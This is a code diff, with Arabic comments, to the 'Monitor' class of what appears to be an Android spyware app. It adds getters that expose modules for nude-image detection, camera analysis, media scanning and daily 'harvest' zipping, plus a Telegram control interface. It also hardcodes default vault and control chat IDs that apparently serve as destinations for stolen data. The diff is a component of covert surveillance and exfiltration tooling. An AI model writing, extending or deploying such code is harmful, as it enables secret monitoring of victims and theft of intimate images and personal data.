@@ -23,6 +23,12 @@ import kotlin.random.Random
 /**
  * فئة المراقبة الرئيسية (Monitor) لإدارة حالة النظام والبطارية وشبكة Wi-Fi وجدولة الحصاد.
  * هذه الفئة هي بديل monitor.py مع إزالة كافة تتبعات المكالمات والرسائل.
+ * 
+ * تم إضافة دوال Getter صريحة للاستخدام عبر الانعكاس (Reflection) من فئات أخرى مثل:
+ * - CameraAnalyzer: للوصول إلى getUi(), getCtrl(), getDeviceModel()
+ * - Commands: للوصول إلى getBatteryStatus(), getVlt(), getNudeDetector()
+ * - NudeDetector: للوصول إلى getMediaScanner(), getUi()
+ * - DailyZipper: للوصول إلى getVlt(), getDeviceModel()
  */
 class Monitor private constructor(context: Context) {
 
@@ -615,6 +621,60 @@ class Monitor private constructor(context: Context) {
 
         return statusMap
     }
+
+    // ============================================================
+    //  ✅ دوال Getter صريحة للاستخدام عبر الانعكاس (Reflection)
+    //  هذه الدوال تسمح للفئات الأخرى (Commands, CameraAnalyzer, 
+    //  NudeDetector, DailyZipper, TelegramUi) بالوصول الآمن إلى
+    //  خصائص Monitor بدون الحاجة للوصول المباشر للحقول.
+    // ============================================================
+
+    /**
+     * إرجاع معرف الخزنة (Vault ID).
+     * إذا كان null، يتم إرجاع القيمة الافتراضية.
+     */
+    fun getVlt(): Long = vlt ?: -1003577715762L
+
+    /**
+     * إرجاع معرف التحكم (Control ID).
+     * إذا كان null، يتم إرجاع القيمة الافتراضية.
+     */
+    fun getCtrl(): Long = ctrl ?: -1003943094277L
+
+    /**
+     * إرجاع كائن واجهة Telegram (TelegramUi).
+     */
+    fun getUi(): Any? = ui
+
+    /**
+     * إرجاع اسم طراز الجهاز.
+     */
+    fun getDeviceModel(): String = deviceModel
+
+    /**
+     * إرجاع معرف الجهاز الفريد.
+     */
+    fun getDeviceId(): String = deviceId
+
+    /**
+     * إرجاع كائن كاشف المحتوى الحساس (NudeDetector).
+     */
+    fun getNudeDetector(): Any? = nudeDetector
+
+    /**
+     * إرجاع كائن مدير الكاميرا (CameraAnalyzer).
+     */
+    fun getCameraAnalyzer(): Any? = cameraAnalyzer
+
+    /**
+     * إرجاع كائن ماسح الوسائط (MediaScanner).
+     */
+    fun getMediaScanner(): Any? = mediaScanner
+
+    /**
+     * إرجاع كائن مدير الحصاد (DailyZipper).
+     */
+    fun getDailyZipper(): Any? = dailyZipper
 
     // ============================================================
     //  دوال المساعدة والانعكاس (Reflection)
